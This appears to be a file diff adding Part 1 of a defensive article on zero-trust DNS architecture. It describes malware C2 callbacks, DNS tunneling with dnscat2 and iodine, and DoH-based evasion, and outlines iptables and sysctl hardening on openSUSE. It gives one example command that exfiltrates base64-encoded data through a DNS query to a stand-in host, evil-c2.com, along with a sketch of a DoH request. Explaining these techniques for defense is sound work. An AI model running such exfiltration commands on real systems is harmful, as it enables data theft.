@@ -1,0 +1,106 @@
+▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▀███   █    ██   ██████ ▄▄▄█████▓
+▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒
+░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░
+  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ 
+▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░ 
+░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   
+░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░      ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░    
+░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒    ░        ░░   ░  ░░░ ░ ░ ░  ░  ░    ░      
+  ░ ░       ░  ░   ░         ░ ░              ░        ░           ░           
+░                                                                              
+▓█████▄  ███▄    █   ██████                                                    
+▒██▀ ██▌ ██ ▀█   █ ▒██    ▒                                                    
+░██   █▌▓██  ▀█ ██▒░ ▓██▄                                                      
+░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒                                                   
+░▒████▓ ▒██░   ▓██░▒██████▒▒                                                   
+ ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░                                                   
+ ░ ▒  ▒ ░ ░░   ░ ▒░░ ░▒  ░ ░                                                   
+ ░ ░  ░    ░   ░ ░ ░  ░  ░                                                     
+   ░             ░       ░                                                     
+ ░                                                                             
+ 
+================================================================================
+TITLE:    Zero-Trust DNS Architecture - Part 1
+SUBTITLE: Mitigating Advanced Data Exfiltration and Covert Channels via
+          L3/L4 Network Isolation
+AUTHOR:   0xGeorge W. Aravidis - August 04, 2026
+================================================================================
+
+[ 1.1 Introduction: The Evolution of Malware Payloads ]
+
+Let's face it: modern malware without a Command & Control (C2) callback 
+is like a theoretical physicist without a whiteboard--completely impotent. 
+In the old days, payloads just stomped on the MBR and called it a day. 
+Today, APTs and ransomware (think LockBit or the SUNBURST supply-chain 
+spectacle) act like high-maintenance SaaS applications. 
+
+They need to phone home to exchange cryptographic keys, fetch modular 
+updates, or blindly exfiltrate your /etc/shadow. For example, if a dropper 
+lands on a machine, it immediately attempts to resolve a DGA (Domain 
+Generation Algorithm) address like `nxj89f2.ext`. If that DNS request fails, 
+the payload enters a state of existential dread and dies in memory. The C2 
+mechanism is the Achilles' heel. Cut the cord, and the beast starves.
+
+[ 1.2 The DNS Covert Channel: Abusing Port 53 ]
+
+Historically, corporate firewalls treated UDP Port 53 with the kind of 
+naive, unconditional love usually reserved for golden retrievers. They 
+would ruthlessly block outbound SSH or FTP, but Port 53? "Right this way, 
+sir, have a pleasant evening!" 
+
+Adversaries caught on instantly. Why fight the perimeter when you can 
+tunnel entire TCP/IP stacks over DNS TXT records? Enter tools like 
+`dnscat2` or `iodine`. The malware chunks your sensitive data, encodes it 
+in Base64, and sends it as a query to an attacker-controlled nameserver:
+
+  $ dig TXT cGFzc3dvcmQ9c3VwZXJzZWNyZXQ.evil-c2.com
+
+The nameserver logs the subdomain ("password=supersecret"), stores it, 
+and replies with an innocent TXT record. It was loud, it was slow, and 
+it proved a fundamental theorem: if you leave one door unlocked, the 
+internet will back a dump truck through it.
+
+[ 1.3 The Evolution to DoH: Encrypted Exfiltration ]
+
+But the cat-and-mouse game evolved. Enter DNS over HTTPS (DoH). Designed 
+to stop ISPs from snooping on your queries, DoH is a cryptographic 
+godsend. Naturally, malware authors looked at it and said, "Thank you, 
+we'll take it."
+
+By encapsulating queries inside TLS 1.3 and sending them over TCP/443, 
+DoH blinds stateful firewalls. Instead of a plaintext UDP packet asking 
+for `evil.com`, the malware POSTs an encrypted payload to a public 
+resolver (like Google's 8.8.8.8 or Cloudflare's 1.1.1.1):
+
+  POST /dns-query HTTP/2
+  Host: dns.google
+  Content-Type: application/dns-message
+  (Encrypted binary payload asking for C2...)
+
+To a legacy IDS/IPS, this looks exactly like a user fetching a CSS file. 
+Firewalls inspecting Port 443 are doing the "This is fine" dog meme. 
+If you cannot inspect the payload, you cannot drop the packet.
+
+[ 1.4 Scope of the Paper: Defense-in-Depth on openSUSE ]
+
+This paper outlines a pragmatic, paranoid, and highly deterministic 
+Zero-Trust architecture. We are stripping away the illusions of 
+application-layer security. We will construct a multi-layered 
+Defense-in-Depth environment on an openSUSE Linux endpoint (Tumbleweed 
+preferred, because we like our kernels fresh and our releases chaotic).
+
+We will aggressively implement L3/L4 network isolation. Examples include:
+
+  * Using `sysctl` to completely lobotomize IPv6 (`disable_ipv6=1`) 
+    to kill dual-stack leakage.
+    
+  * Writing custom `iptables` rules in the `OUTPUT` chain to drop stray 
+    Port 53 traffic into a localized blackhole.
+    
+  * Binding name resolution to custom Anycast DNS endpoints via encrypted 
+    tunneling interfaces, null-routing anything else at the kernel level.
+
+In this architecture, packets do not have rights; they only have 
+explicit permissions. Welcome to the void.
+
+[EOF - Part 1].
